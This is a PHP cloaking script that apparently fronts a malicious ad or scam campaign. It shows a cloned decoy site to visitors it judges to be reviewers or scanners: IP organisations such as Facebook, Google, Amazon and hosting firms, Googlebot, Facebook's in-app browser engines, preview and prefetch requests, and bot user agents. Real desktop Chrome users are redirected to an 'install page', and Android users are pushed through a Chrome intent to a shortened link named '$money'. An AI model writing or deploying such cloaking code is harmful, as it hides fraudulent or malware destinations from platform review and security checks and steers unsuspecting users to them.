<?php
//header('Access-Control-Allow-Origin: *');
error_reporting(E_ERROR | E_PARSE);
include __DIR__ ."/includes/functions.php";


  $bannedORGS = "Grapeshot|Ocean|Department|Amazon|Aerojet|Linode|Yandex|Python|Proxy|IANA|MegaPath|Private|KDDI|Facebook|FB|fb|Temasek|Edge|Anonymous|Proxy|VPS|Haskell|M247|Iliad|Taiwan Academic Network|Consolidated Communications|TE Data|AS250|LIAZO|Datasource|Turk|Accelerated|Broadnet|UK2|root|SURFnet|NFOrce,Voxility|ARBITAL|Privax|Google|Steadfast Networks|Facebook|Microsoft Corporation|CtrlS D";
  $bannedCountries = "TR|US|CA|RU|IR|JP|TM|MK";
  $money = "bit.ly/2GWlafT";
  $installPage = "http://INSTALL.PAGE";


  // $XFBSIMHNI = $_SERVER['HTTP_X_FB_SIM_HNI'];
  // $fbsim = preg_match('/^([0-9]{5})/',$XFBSIMHNI);




  if(banned_org(Detect::ipOrg(), $bannedORGS)){
    cloneWeb();
    exit();
  	}
  // else if(banned_country(Detect::ipCountry(), $bannedCountries)){
  //   cloneWeb();
  //   exit;
  // }
  else if ((isset($_SERVER['HTTP_FROM'])) && ($_SERVER['HTTP_FROM'] == 'googlebot(at)googlebot.com')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_COOKIE'])) && ($_SERVER['HTTP_COOKIE'] == '')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_ACCEPT'])) && ($_SERVER['HTTP_ACCEPT'] == '*/*')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_PURPOSE'])) && ($_SERVER['HTTP_X_PURPOSE'] == 'preview')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_FB_HTTP_ENGINE'])) && ($_SERVER['HTTP_X_FB_HTTP_ENGINE'] == 'Liger')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_FB_HTTP_ENGINE'])) && ($_SERVER['HTTP_X_FB_HTTP_ENGINE'] == 'Tigon')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_FB_HTTP_ENGINE'])) && ($_SERVER['HTTP_X_FB_HTTP_ENGINE'] == 'iOS')) {
    cloneWeb();
    exit();
  }
  if ((strpos($_SERVER['HTTP_USER_AGENT'], 'scrape') !== false) || (strpos($_SERVER['HTTP_USER_AGENT'], 'python') !== false) || (strpos($_SERVER['HTTP_USER_AGENT'], 'fetch') !== false) || (strpos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false)) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_MOZ'])) && ($_SERVER['HTTP_X_MOZ'] == 'prefetch')) {
    cloneWeb();
    exit();
  } else {
    if (Detect::isComputer() && contains('Chrome', Detect::browser())) {
      header('location: '. $installPage);
      exit;
    } else if (Detect::isMobile() && Detect::isAndroidOS()) {
      header('location: intent://'. $money .'#Intent;scheme=http;package=com.android.chrome;end');
      exit;
    } else  {
      header('location: '. $money);
      exit;
    }
  }
?>
